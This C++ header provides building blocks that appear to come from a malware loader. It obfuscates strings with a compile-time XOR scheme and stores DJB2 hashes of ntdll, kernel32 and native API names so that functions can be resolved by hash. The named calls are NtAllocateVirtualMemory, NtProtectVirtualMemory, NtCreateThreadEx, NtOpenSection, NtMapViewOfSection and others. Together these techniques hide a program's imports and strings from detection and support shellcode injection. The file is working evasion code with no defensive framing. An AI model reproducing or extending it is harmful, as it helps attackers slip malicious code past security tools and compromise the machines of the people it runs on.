#pragma once
#include <stdint.h>

template<size_t N>
class ObfString {
    char m_data[N];
    static constexpr uint8_t KEY = 0x5A;
public:
    constexpr ObfString(const char(&str)[N]) : m_data{} {
        for (size_t i = 0; i < N; ++i)
            m_data[i] = str[i] ^ KEY ^ static_cast<uint8_t>((i * 7) & 0xFF);
    }
    void decrypt(char* out, size_t outSize) const {
        if (outSize == 0) return;
        size_t i = 0;
        for (; i < outSize - 1 && i < N - 1; ++i)
            out[i] = m_data[i] ^ KEY ^ static_cast<uint8_t>((i * 7) & 0xFF);
        out[i] = '\0';
    }
};

template<size_t N>
class ObfWString {
    wchar_t m_data[N];
    static constexpr uint16_t KEY = 0x5A5A;
public:
    constexpr ObfWString(const wchar_t(&str)[N]) : m_data{} {
        for (size_t i = 0; i < N; ++i)
            m_data[i] = str[i] ^ KEY ^ static_cast<uint16_t>((i * 13) & 0xFFFF);
    }
    void decrypt(wchar_t* out, size_t outCount) const {
        if (outCount == 0) return;
        size_t i = 0;
        for (; i < outCount - 1 && i < N - 1; ++i)
            out[i] = m_data[i] ^ KEY ^ static_cast<uint16_t>((i * 13) & 0xFFFF);
        out[i] = L'\0';
    }
};

#define DECRYPT_STR(var, s) \
    static constexpr ObfString<sizeof(s)> _obf_##var(s); \
    char var[sizeof(s)]; \
    _obf_##var.decrypt(var, sizeof(var))

#define DECRYPT_WSTR(var, s) \
    static constexpr ObfWString<sizeof(s)/sizeof(wchar_t)> _obf_##var(s); \
    wchar_t var[sizeof(s)/sizeof(wchar_t)]; \
    _obf_##var.decrypt(var, sizeof(var)/sizeof(wchar_t))

#define CLEAR_STR(var) VolatileZero(var, sizeof(var))

constexpr uint32_t HashDjb2(const char* str, size_t idx = 0, uint32_t hash = 5381) {
    return str[idx] == '\0' ? hash : HashDjb2(str, idx + 1, ((hash << 5) + hash) + static_cast<uint8_t>(str[idx]));
}

__forceinline uint32_t HashDjb2RT(const char* str) {
    uint32_t hash = 5381;
    while (*str) hash = ((hash << 5) + hash) + static_cast<uint8_t>(*str++);
    return hash;
}

namespace Hashes {
    constexpr uint32_t NTDLL = HashDjb2("ntdll.dll");
    constexpr uint32_t KERNEL32 = HashDjb2("kernel32.dll");
    constexpr uint32_t KERNELBASE = HashDjb2("kernelbase.dll");
    constexpr uint32_t NtAllocateVirtualMemory = HashDjb2("NtAllocateVirtualMemory");
    constexpr uint32_t NtProtectVirtualMemory = HashDjb2("NtProtectVirtualMemory");
    constexpr uint32_t NtCreateThreadEx = HashDjb2("NtCreateThreadEx");
    constexpr uint32_t NtWaitForSingleObject = HashDjb2("NtWaitForSingleObject");
    constexpr uint32_t NtClose = HashDjb2("NtClose");
    constexpr uint32_t NtFreeVirtualMemory = HashDjb2("NtFreeVirtualMemory");
    constexpr uint32_t NtQueryInformationProcess = HashDjb2("NtQueryInformationProcess");
    constexpr uint32_t NtOpenSection = HashDjb2("NtOpenSection");
    constexpr uint32_t NtMapViewOfSection = HashDjb2("NtMapViewOfSection");
    constexpr uint32_t NtUnmapViewOfSection = HashDjb2("NtUnmapViewOfSection");
    constexpr uint32_t NtReadVirtualMemory = HashDjb2("NtReadVirtualMemory");
    constexpr uint32_t NtTerminateProcess = HashDjb2("NtTerminateProcess");
    constexpr uint32_t NtDelayExecution = HashDjb2("NtDelayExecution");
}
